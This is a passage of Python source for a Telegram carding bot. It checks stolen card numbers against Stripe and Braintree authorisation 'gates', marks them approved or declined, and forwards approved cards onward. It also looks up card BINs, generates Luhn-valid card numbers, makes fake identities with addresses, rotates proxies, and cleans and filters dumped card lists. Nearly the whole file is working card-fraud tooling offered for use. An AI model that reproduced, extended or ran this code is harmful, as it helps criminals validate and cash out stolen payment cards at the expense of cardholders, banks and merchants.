         if cc == 'None':
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
        Please ensure you enter the card details in the correct format:
        Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
          return
         start_time = time.time()
         try:
          result = autostripe_check(cc, user_id, slot)
          last = result.get('message', 'Unknown')
          is_approved = result.get('approved', False)
         except Exception as e:
          last='Error'
          is_approved = False
         data = {}
         try:
          data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=10).json()
         except:
          pass
         brand = data.get('brand', 'Unknown')
         card_type = data.get('type', 'Unknown')
         country = data.get('country_name', 'Unknown')
         country_flag = data.get('country_flag', '')
         bank = data.get('bank', 'Unknown')
         end_time = time.time()
         execution_time = end_time - start_time
         msg = f"""
<b>✅ Approved (/ast{slot})</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         msgd = f"""
<b>❌ Declined (/ast{slot})</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         if is_approved:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
          user_info = {'id': message.from_user.id, 'username': message.from_user.username, 'first_name': message.from_user.first_name}
          forward_approved_card(cc, gate, last, user_info)
         else:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)


@bot.message_handler(func=lambda message: message.text and (message.text.lower().startswith('.st') or message.text.lower().startswith('/st')) and not message.text.lower().startswith('.stc') and not message.text.lower().startswith('/stc') and not re.match(r'^[./]st(art|op|atus)', message.text, re.IGNORECASE))
def respond_to_st(message):
         if not is_user_allowed(message.from_user.id):
             bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
             return
         gate='𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡'
         
         file_cards = get_cards_from_reply(message)
         if file_cards:
             mass_check_cards(message, file_cards, 'stripe', 'Stripe Auth')
             return
         
         try:
          text = message.reply_to_message.text
         except:
          text = message.text
         
         cards = extract_cards(text)
         if len(cards) > 1:
             mass_check_cards(message, cards, 'stripe', 'Stripe Auth')
             return
         
         ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...🔁").message_id)
         cc=str(reg(text))
         if cc == 'None':
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
        Please ensure you enter the card details in the correct format:
        Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
          return
         start_time = time.time()
         try:
          last = str(stripe_auth(cc))
         except Exception as e:
          last='Error'
         data = {}
         try:
          data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=10).json()
         except:
          pass
         brand = data.get('brand', 'Unknown')
         card_type = data.get('type', 'Unknown')
         country = data.get('country_name', 'Unknown')
         country_flag = data.get('country_flag', '')
         bank = data.get('bank', 'Unknown')
         end_time = time.time()
         execution_time = end_time - start_time
         msg = f"""
<b>✅ Approved (/st)</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         msgd = f"""
<b>❌ Declined (/st)</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         if 'Approved' in last or 'succeeded' in last or 'success' in last:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
          user_info = {'id': message.from_user.id, 'username': message.from_user.username, 'first_name': message.from_user.first_name}
          forward_approved_card(cc, gate, last, user_info)
         else:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)


@bot.message_handler(func=lambda message: message.text.lower().startswith('.b3') or message.text.lower().startswith('/b3'))
def respond_to_b3(message):
         if not is_user_allowed(message.from_user.id):
             bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
             return
         
         gate='𝐵𝑟𝑎𝑖𝑛𝑡𝑟𝑒𝑒 𝐀𝐮𝐭𝐡 #𝟑'
         
         file_cards = get_cards_from_reply(message)
         if file_cards:
             mass_check_cards(message, file_cards, 'braintree', 'Braintree Auth #3')
             return
         
         try:
          text = message.reply_to_message.text
         except:
          text = message.text
          if text.lower().startswith('/b3'):
              text = text[3:].strip()
          elif text.lower().startswith('.b3'):
              text = text[3:].strip()
         
         cards = extract_cards(text)
         if not cards:
             cards = clean_card_format(text)
         
         if len(cards) > 1:
             mass_check_cards(message, cards, 'braintree', 'Braintree Auth #3')
             return
         
         ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...🔁").message_id)
         
         cc = cards[0] if cards else str(reg(text))
         cc = str(cc)
         if cc == 'None':
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
        Please ensure you enter the card details in the correct format:
        Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
          return
         start_time = time.time()
         is_approved = False
         try:
          result = gatet(cc)
          if isinstance(result, dict):
              last = result.get('message', 'Unknown')
              is_approved = result.get('approved', False)
          else:
              last = str(result) if result else 'Error'
         except Exception as e:
          last='Error'
         data = {}
         try:
          data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=10).json()
         except:
          pass
         brand = data.get('brand', 'Unknown')
         card_type = data.get('type', 'Unknown')
         country = data.get('country_name', 'Unknown')
         country_flag = data.get('country_flag', '')
         bank = data.get('bank', 'Unknown')
         end_time = time.time()
         execution_time = end_time - start_time
         msg = f"""
<b>✅ Approved (/b3)</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         msgd = f"""
<b>❌ Declined (/b3)</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         if is_approved:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
          user_info = {'id': message.from_user.id, 'username': message.from_user.username, 'first_name': message.from_user.first_name}
          forward_approved_card(cc, gate, last, user_info)
         else:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)


@bot.message_handler(func=lambda message: message.text.lower().startswith('.fake') or message.text.lower().startswith('/fake'))
def respond_to_vbv(message):
        def my_function():
                try:
                        try:
                                u=message.text.split('fake')[1]
                        except:
                                u='US','UK','is','JO','KSA','MO'
                        parsed_data = requests.get(f'https://randomuser.me/api/?nat={u}').json()
                        results = parsed_data['results']
                        result = results[0]
                        name = f"{result['name']['title']} {result['name']['first']} {result['name']['last']}"
                        street_number = result['location']['street']['number']
                        street_name = result['location']['street']['name']
                        city = result['location']['city']
                        state = result['location']['state']
                        country = result['location']['country']
                        postcode = result['location']['postcode']
                        fake = Faker()
                        phone = fake.phone_number()
                        email = fake.email()
                        formatted_address = f"""<b>
📍 Address Generator
━━━━━━━━━━----------------
{country} Address
Name: <code>{name}</code>
City: <code>{city}</code>
state: <code>{state}</code>
Zip Code: <code>{postcode}</code>
Street: <code>{street_number} {street_name}</code>
  Phone: <code>{phone}</code>
   Email: {email}
𝗕𝘆 ⇾ {DEV_NAME}
   </b>
                        """
                        bot.reply_to(message, formatted_address,parse_mode="HTML")
                except:
                        bot.reply_to(message, "Country code not found or not available. us, uk, mo")
        my_thread = threading.Thread(target=my_function)
        my_thread.start()
def gen(bin):
        remaining_digits = 16 - len(bin)
        card_number = bin + ''.join([str(random.randint(0, 9)) for _ in range(remaining_digits - 1)])
        digits = [int(digit) for digit in card_number]
        for i in range(len(digits)):
                if i % 2 == 0:
                        digits[i] *= 2
                        if digits[i] > 9:
                                digits[i] -= 9
        
        checksum = sum(digits)
        checksum %= 10
        checksum = 10 - checksum
        if checksum == 10:
                checksum = 0
        card_number += str(checksum)
        return card_number
        

        
                


def gen_card(bin_value, mes_value=None, ano_value=None, cvv_value=None):
    card_number = f"{bin_value}{random.randint(100000000, 999999999)}"
    exp_m = mes_value if mes_value else str(random.randint(1, 12)).zfill(2)
    exp_y = ano_value if ano_value else str(random.randint(23, 30))
    cvv = cvv_value if cvv_value else str(random.randint(100, 999))
    return card_number, exp_m, exp_y, cvv

def process_bin_info(bin_value):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_value}')
        data = response.json()
    except:
        return {
            'brand': 'Unknown',
            'card_type': 'Unknown',
            'bank': 'Unknown',
            'country_name': 'Unknown',
            'country_flag': 'Unknown'
        }

    brand = data.get('brand', 'Unknown')
    card_type = data.get('type', 'Unknown')
    country = data.get('country_name', 'Unknown')
    country_flag = data.get('country_flag', 'Unknown')
    bank = data.get('bank', 'Unknown')

    return {
        'brand': brand,
        'card_type': card_type,
        'bank': bank,
        'country_name': country,
        'country_flag': country_flag
    }

@bot.message_handler(commands=['gen'])
@bot.message_handler(func=lambda message: message.text.startswith('.gen'))
def generate_card(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_user_allowed(user_id):
        bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
        return
    
    try:
        initial_message = bot.reply_to(message, "Generating Started...⏳")
        card_info = message.text.split('/gen', 1)[1] if message.text.startswith('/gen') else message.text.split('.gen', 1)[1]
        card_info = card_info.strip()

        def multi_explode(delimiters, string):
            pattern = '|'.join(map(re.escape, delimiters))
            return [x for x in re.split(pattern, string) if x]

        split_values = multi_explode([":", "|", "⋙", " ", "/"], card_info)
        bin_value = ""
        mes_value = None
        ano_value = None
        cvv_value = None

        if len(split_values) >= 1:
            bin_value = re.sub(r'[^0-9x]', '', split_values[0])
        if len(split_values) >= 2:
            mes_value = re.sub(r'[^0-9x]', '', split_values[1]) if split_values[1] else None
        if len(split_values) >= 3:
            ano_value = re.sub(r'[^0-9x]', '', split_values[2]) if split_values[2] else None
        if len(split_values) >= 4:
            cvv_value = re.sub(r'[^0-9x]', '', split_values[3]) if split_values[3] else None

        if not bin_value or len(bin_value) < 6:
            bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text="⚠️ Please provide at least 6 digit BIN\nUsage: /gen 424242")
            return

        card_details = get_card_info(bin_value)
        card_length = card_details['length']
        cvv_len = card_details['cvv_length']
        
        cards_data = ""
        for _ in range(10):
            card_number = generate_luhn_card(bin_value, card_length)
            exp_m = mes_value if mes_value and mes_value != 'x' else str(random.randint(1, 12)).zfill(2)
            exp_y = ano_value if ano_value and ano_value != 'x' else str(random.randint(25, 30))
            if cvv_value and cvv_value != 'x':
                cvv = cvv_value
            else:
                if cvv_len == 4:
                    cvv = str(random.randint(1000, 9999))
                else:
                    cvv = str(random.randint(100, 999))
            cards_data += f"<code>{card_number}|{exp_m}|{exp_y}|{cvv}</code>\n"

        bin_info = process_bin_info(bin_value[:6])

        msg = f"""
𝗕𝗜𝗡 ⇾ <code>{bin_value}</code>
𝗔𝗺𝗼𝘂𝗻𝘁 ⇾ 10
𝗧𝘆𝗽𝗲 ⇾ {card_details['brand']} ({card_length} digits)

{cards_data}
𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['card_type']} - {bin_info['bank']}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info['country_name']} {bin_info['country_flag']}
◆ 𝑩𝒀: 𝗕𝗼𝘁 𝗕𝘆 ⇾ {DEV_NAME}
"""
        bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=msg, parse_mode='HTML')
    except Exception as e:
        bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=f"An error occurred: {e}")
        
#







#
#
#



@bot.message_handler(commands=['allow'])
def allow_user_handler(message):
    user_id = message.from_user.id
    if user_id != admin:
        bot.reply_to(message, f"⚠️ Admin Only Command\nContact {DEV_NAME}")
        return
    
    try:
        target = message.text.split('/allow', 1)[1].strip()
        if not target:
            bot.reply_to(message, "⚠️ Usage: /allow 123456789")
            return
        
        target_id = int(target)
        if add_allowed_user(target_id):
            bot.reply_to(message, f"✅ User Added Successfully\n\n👤 User ID: <code>{target_id}</code>\n📊 Total Users: {len(get_allowed_users())}")
        else:
            bot.reply_to(message, f"⚠️ User {target_id} already exists")
    except ValueError:
        bot.reply_to(message, "⚠️ Invalid user ID. Must be a number")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:50]}")

@bot.message_handler(commands=['disallow'])
def disallow_user_handler(message):
    user_id = message.from_user.id
    if user_id != admin:
        bot.reply_to(message, f"⚠️ Admin Only Command\nContact {DEV_NAME}")
        return
    
    try:
        target = message.text.split('/disallow', 1)[1].strip()
        if not target:
            bot.reply_to(message, "⚠️ Usage: /disallow 123456789")
            return
        
        target_id = int(target)
        if target_id == admin:
            bot.reply_to(message, "⚠️ Cannot remove admin")
            return
            
        if remove_allowed_user(target_id):
            bot.reply_to(message, f"✅ User Removed Successfully\n\n👤 User ID: <code>{target_id}</code>\n📊 Total Users: {len(get_allowed_users())}")
        else:
            bot.reply_to(message, f"⚠️ User {target_id} not found")
    except ValueError:
        bot.reply_to(message, "⚠️ Invalid user ID. Must be a number")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:50]}")

@bot.message_handler(commands=['users'])
def view_users_handler(message):
    user_id = message.from_user.id
    if user_id != admin:
        bot.reply_to(message, f"⚠️ Admin Only Command\nContact {DEV_NAME}")
        return
    
    users = get_allowed_users()
    if not users:
        bot.reply_to(message, "📋 No users allowed")
        return
    
    users_list = "\n".join([f"• <code>{uid}</code>" + (" 👑" if uid == admin else "") for uid in users])
    bot.reply_to(message, f"📋 Allowed Users ({len(users)})\n\n{users_list}")

#  
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
        id=call.from_user.id
        stopuser[f'{id}']['status'] = 'stop'

@bot.message_handler(commands=['addproxy'])
def add_proxy_handler(message):
    user_id = message.from_user.id
    if user_id != admin:
        bot.reply_to(message, f"⚠️ Admin Only Command\nContact {DEV_NAME}")
        return
    
    try:
        proxy = message.text.split('/addproxy', 1)[1].strip()
        if not proxy:
            bot.reply_to(message, "⚠️ Usage: /addproxy user:pass@ip:port")
            return
        
        testing_msg = bot.reply_to(message, "🔄 Testing proxy connection...")
        
        success, result = add_proxy(proxy)
        if success:
            bot.edit_message_text(
                f"✅ Proxy Added Successfully\n\n🔐 Proxy: <code>{proxy}</code>\n🌐 IP: {result}\n📊 Total Proxies: {proxy_count()}",
                chat_id=message.chat.id,
                message_id=testing_msg.message_id
            )
        else:
            bot.edit_message_text(
                f"❌ {result}",
                chat_id=message.chat.id,
                message_id=testing_msg.message_id
            )
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:50]}")

@bot.message_handler(commands=['delproxy'])
def del_proxy_handler(message):
    user_id = message.from_user.id
    if user_id != admin:
        bot.reply_to(message, f"⚠️ Admin Only Command\nContact {DEV_NAME}")
        return
    
    try:
        proxy = message.text.split('/delproxy', 1)[1].strip()
        if not proxy:
            bot.reply_to(message, "⚠️ Usage: /delproxy user:pass@ip:port")
            return
        
        if remove_proxy(proxy):
            bot.reply_to(message, f"✅ Proxy Removed Successfully\n📊 Total Proxies: {proxy_count()}")
        else:
            bot.reply_to(message, "⚠️ Proxy not found!")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:50]}")

@bot.message_handler(commands=['proxies'])
def view_proxies_handler(message):
    user_id = message.from_user.id
    if user_id != admin:
        bot.reply_to(message, f"⚠️ Admin Only Command\nContact {DEV_NAME}")
        return
    
    proxies = get_all_proxies()
    if not proxies:
        bot.reply_to(message, "📭 No proxies configured\n\nUse /addproxy user:pass@ip:port")
        return
    
    proxy_list = "\n".join([f"🔐 <code>{p}</code>" for p in proxies[:20]])
    msg = f"""
━━━━ 𝗣𝗥𝗢𝗫𝗬 𝗟𝗜𝗦𝗧 ━━━━

{proxy_list}

📊 Total: {len(proxies)} proxies
"""
    bot.reply_to(message, msg)

@bot.message_handler(commands=['clearproxy'])
def clear_proxy_handler(message):
    user_id = message.from_user.id
    if user_id != admin:
        bot.reply_to(message, f"⚠️ Admin Only Command\nContact {DEV_NAME}")
        return
    
    clear_proxies()
    bot.reply_to(message, "✅ All proxies cleared successfully!")


@bot.message_handler(commands=['clean'])
def clean_cards_handler(message):
    if not is_user_allowed(message.from_user.id):
        bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
        return
    
    text_to_clean = None
    reply = message.reply_to_message
    
    if reply:
        if reply.document and reply.document.file_name.endswith('.txt'):
            try:
                file_info = bot.get_file(reply.document.file_id)
                downloaded = bot.download_file(file_info.file_path)
                text_to_clean = downloaded.decode('utf-8', errors='ignore')
            except:
                bot.reply_to(message, "❌ Failed to read the file")
                return
        elif reply.text:
            text_to_clean = reply.text
    else:
        cmd_text = message.text.replace('/clean', '').strip()
        if cmd_text:
            text_to_clean = cmd_text
    
    if not text_to_clean:
        bot.reply_to(message, f"""<b>📝 Clean Cards Command</b>

Reply to a .txt file or paste cards to clean.
Output format: <code>card|mm|yy|cvv</code>

<b>Usage:</b>
• Reply to a .txt file with /clean
• Reply to a message with cards with /clean
• /clean followed by pasted cards

Bot By → {DEV_NAME}""", parse_mode="HTML")
        return
    
    cards = clean_card_format(text_to_clean)
    
    if not cards:
        bot.reply_to(message, "❌ No valid cards found in the input")
        return
    
    clean_content = "\n".join(cards)
    
    with open("cleaned_cards.txt", "w") as f:
        f.write(clean_content)
    
    with open("cleaned_cards.txt", "rb") as f:
        bot.send_document(
            message.chat.id,
            f,
            caption=f"✅ Cleaned {len(cards)} cards\nBot By → {DEV_NAME}",
            reply_to_message_id=message.message_id
        )
    
    os.remove("cleaned_cards.txt")


@bot.message_handler(commands=['filter'])
def filter_cards_handler(message):
    if not is_user_allowed(message.from_user.id):
        bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
        return
    
    parts = message.text.split()
    bin_to_filter = None
    
    if len(parts) >= 2:
        bin_to_filter = parts[1].strip()
    
    if not bin_to_filter or len(bin_to_filter) < 4:
        bot.reply_to(message, f"""<b>🔍 Filter Cards by BIN</b>

Reply to a .txt file or message with cards and provide BIN.

<b>Usage:</b>
• Reply to a .txt file: /filter 424242
• Reply to a message: /filter 424242

<b>BIN Format:</b>
• 4-8 digits (e.g., 424242, 45717360)

Bot By → {DEV_NAME}""", parse_mode="HTML")
        return
    
    text_to_filter = None
    reply = message.reply_to_message
    
    if reply:
        if reply.document and reply.document.file_name.endswith('.txt'):
            try:
                file_info = bot.get_file(reply.document.file_id)
                downloaded = bot.download_file(file_info.file_path)
                text_to_filter = downloaded.decode('utf-8', errors='ignore')
            except:
                bot.reply_to(message, "❌ Failed to read the file")
                return
        elif reply.text:
            text_to_filter = reply.text
    
    if not text_to_filter:
        bot.reply_to(message, "❌ Reply to a .txt file or message with cards")
        return
    
    all_cards = extract_cards(text_to_filter)
    
    if not all_cards:
        bot.reply_to(message, "❌ No valid cards found in the input")
        return
    
    filtered_cards = [cc for cc in all_cards if cc.startswith(bin_to_filter)]
    
    if not filtered_cards:
        bot.reply_to(message, f"❌ No cards found with BIN: {bin_to_filter}\n\nTotal cards scanned: {len(all_cards)}")
        return
    
    filter_content = "\n".join(filtered_cards)
    filename = f"filtered_{bin_to_filter}.txt"
    
    with open(filename, "w") as f:
        f.write(filter_content)
    
    with open(filename, "rb") as f:
        bot.send_document(
            message.chat.id,
            f,
            caption=f"✅ Found {len(filtered_cards)} cards with BIN: {bin_to_filter}\n📊 Total scanned: {len(all_cards)}\nBot By → {DEV_NAME}",
            reply_to_message_id=message.message_id
        )
    
    os.remove(filename)


print("Bot Start On ✅ ")
while True:
        try:
                bot.polling(none_stop=True)
        except Exception as e:
                print(f"Error occurred: {e}")
